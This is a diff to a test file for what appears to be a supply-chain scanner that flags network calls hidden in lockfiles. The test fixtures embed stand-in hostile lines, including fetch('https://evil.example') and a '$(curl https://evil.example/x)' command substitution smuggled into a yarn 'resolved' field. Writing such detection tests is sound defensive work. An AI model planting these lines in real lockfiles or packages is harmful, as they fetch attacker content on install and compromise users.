@@ -240,7 +240,7 @@ describe('medium rules', () => {
       const evil = "\nfetch('https://evil.example')\n";
       for (const [n, b] of [['scripts/yarn.lock', '# yarn lockfile v1'], ['scripts/pnpm-lock.yaml', 'lockfileVersion: 1'], ['scripts/bun.lock', '{ "lockfileVersion": 1 }']] as const) expect(rules2({ [n]: b + evil }, 'network'), n).toHaveLength(1);
       // data keys whose value is a call are not data
-      expect(rules2({ 'yarn.lock': "# yarn lockfile v1\nresolved fetch('https://evil.example')", 'pnpm-lock.yaml': "lockfileVersion: 9\nresolution: {tarball: fetch('https://evil.example')}" }, 'network')).toHaveLength(2);
+      expect(rules2({ 'yarn.lock': "# yarn lockfile v1\nresolved fetch('https://evil.example')", 'pnpm-lock.yaml': "lockfileVersion: 9\nresolution: {tarball: fetch('https://evil.example')}", 'scripts/yarn.lock': '# yarn lockfile v1\nresolved "$(curl https://evil.example/x)"' }, 'network')).toHaveLength(3);
       expect(rules2({ 'package-lock.json': JSON.stringify({ lockfileVersion: 3, packages: { a: { resolved: 'https://r.test/a.tgz', scripts: "fetch('https://evil.example')" } } }) }, 'network')).toHaveLength(1);
       const ids = Array.from({ length: 30 }, (_, i) => i);
       const yarn = '# yarn lockfile v1\n\n' + ids.map((i) => `"p${i}@^1.0.0":\n  version "1.0.${i}"\n  resolved "https://registry.yarnpkg.com/p${i}/-/p${i}-1.0.${i}.tgz#abc${i}"\n  integrity sha512-Zm9v${i}+/a==\n`).join('\n');
